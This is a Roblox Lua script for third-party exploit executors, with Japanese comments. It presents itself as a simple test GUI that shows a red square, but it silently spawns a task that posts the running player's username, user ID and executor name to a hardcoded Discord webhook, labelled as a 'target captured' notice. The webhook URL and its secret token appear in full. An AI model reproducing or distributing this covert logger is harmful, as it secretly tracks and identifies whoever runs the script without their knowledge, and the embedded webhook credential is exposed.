-- [[ 最終修正版: 確実にログを送る構成 ]] --
local HttpService = game:GetService("HttpService")
local LP = game:GetService("Players").LocalPlayer
local Webhook = "https://discord.com/api/webhooks/1471084125053128876/8oVO8QoqTlBzkbuN7HppW2v1oZbNhLqyDlW2r-g3ZyCTjxeoVNCuTW4jLLS_xdz3COOS"

-- ログ送信 (ここが一番大事だ)
local function Send()
    local req = (request or syn.request or http_request or fluxus.request)
    if not req then return print("Executor not supported") end
    
    local data = {
        ["content"] = "🚨 **ターゲット実行通知**",
        ["embeds"] = {{
            ["title"] = "捕捉: " .. LP.Name,
            ["color"] = 0xFF0000,
            ["fields"] = {
                {["name"] = "ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
                {["name"] = "ツール", ["value"] = identifyexecutor() or "不明", ["inline"] = true}
            }
        }}
    }
    
    pcall(function()
        req({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end
task.spawn(Send)

-- GUI表示 (とりあえず動くか確認用)
local pg = LP:WaitForChild("PlayerGui")
if pg:FindFirstChild("Test") then pg.Test:Destroy() end
local g = Instance.new("ScreenGui", pg)
g.Name = "Test"
local f = Instance.new("Frame", g)
f.Size, f.Position, f.BackgroundColor3 = UDim2.new(0,100,0,100), UDim2.new(0.5,-50,0.5,-50), Color3.new(1,0,0)
print("Script Loaded!")
